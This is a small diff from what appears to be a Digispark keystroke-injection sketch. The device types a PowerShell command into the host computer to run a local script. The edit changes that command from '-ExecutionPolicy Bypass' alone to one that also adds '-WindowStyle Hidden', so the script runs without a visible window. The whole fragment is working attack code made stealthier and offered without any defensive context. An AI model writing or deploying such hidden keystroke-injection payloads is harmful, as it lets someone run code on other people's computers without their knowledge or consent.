@@ -63,7 +63,7 @@ DigiKeyboard.print(
     DigiKeyboard.delay(20); 
     DigiKeyboard.delay(2000);
 
-    DigiKeyboard.print("powershell -ExecutionPolicy Bypass -File script2.ps1");
+    DigiKeyboard.print("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File script2.ps1");
      digitalWrite(1, LOW); 
     DigiKeyboard.delay(20);
     digitalWrite(1, HIGH); 
